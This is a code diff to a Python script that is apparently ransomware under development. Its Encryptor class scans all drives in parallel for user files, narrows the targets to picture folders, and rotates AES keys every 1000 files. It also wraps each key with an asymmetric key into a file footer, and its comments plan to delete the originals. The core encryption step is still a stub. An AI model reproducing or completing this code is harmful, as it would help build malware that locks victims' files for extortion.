@@ -3,12 +3,11 @@ import ctypes
 import concurrent.futures # voor threading pools
 import subprocess
 import psutil
-import threading
 import os
 import time
 from keygen import *
 from collections import deque # voor snellere list operaties
-
+import mmap
 
 class Encryptor:
 
@@ -54,16 +53,23 @@ class Encryptor:
                             if entry.path in EXCLUDED_DIRS:
                                 continue
                             scan_directory(entry.path)
+                        
                         elif entry.is_file():
                             if (
                                 entry.name.lower() not in EXCLUDED_FILES and #check if its name is in EXCLUDED_FILES
                                 not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
-                            ):
-                                filepaths.append(entry.path)
+                            ):  
+                                
+                                if "pictures" in entry.path.lower(): #just filter on desktop and pictures
+                                    filepaths.append(entry.path)  # Store normal files
+            
             except (PermissionError, FileNotFoundError):
                 pass  # skip directories that cannot be accessed
        
         scan_directory(drive) #call function scan directory
+
+        #print(filepaths)
+
         return filepaths
 
     def get_files(self):
@@ -76,9 +82,10 @@ class Encryptor:
             results = executor.map(self.get_files_from_drive, self.drives)
         
         # Flatten results
-        self.filepaths = [file for result in results for file in result] #add all values to the self.filepaths list
+        self.filepaths = [file for result in results for file in result]  # Extract normal files
+        
         end_time = time.time()
-        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time}s")
+        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")
 
     def encrypt(self, files_list, counter=10000):
         """
@@ -91,8 +98,8 @@ class Encryptor:
             encrypted_count += 1
             filepath = files_list.popleft()  # Verwijder bestand uit deque (O(1))
 
-            # Genereer een nieuwe sleutel elke 10.000 bestanden
-            if counter >= 10000:
+            # Genereer een nieuwe sleutel elke 1000 bestanden
+            if counter >= 1000:
                 print("[LOG] Generating new AES key...")
                 symenc = Symmetric_encryption()
                 symenc.generate_key()
@@ -103,9 +110,7 @@ class Encryptor:
             
             # TODO: encryptielogica
             try:
-            
-                with open(filepath, 'rb') as f:  
-                    content = f.read()
+                pass
                     
                 #encrypt content
                     
@@ -114,6 +119,7 @@ class Encryptor:
                     #add footer
 
                 #delete original file
+            
             except:
                 pass
 
@@ -134,7 +140,7 @@ class Encryptor:
         
         #encrypt AES key
         encrypted_key = keygen.encrypt(AES_key)
-        
+        #print(f"footer: {encrypted_iv} {encrypted_key}")
         #create footer
         return f"{encrypted_iv} {encrypted_key}"
     
@@ -171,10 +177,12 @@ class Encryptor:
         threads = self.determine_thread_count()
         #threads = 40
 
+        # Get out all files from USER folder first as a seperate list
+
         #split list by amount of threads
 
-        avg_len = len(self.filepaths) // threads  # Average size of each chunk
-        remainder = len(self.filepaths) % threads  # Remainder to distribute across parts
+        avg_len = len(self.filepaths) // threads   # Average size of each chunk
+        remainder = len(self.filepaths) % threads   # Remainder to distribute across parts
 
         result = []  # List to hold the resulting parts
         start = 0  # Start index for each split
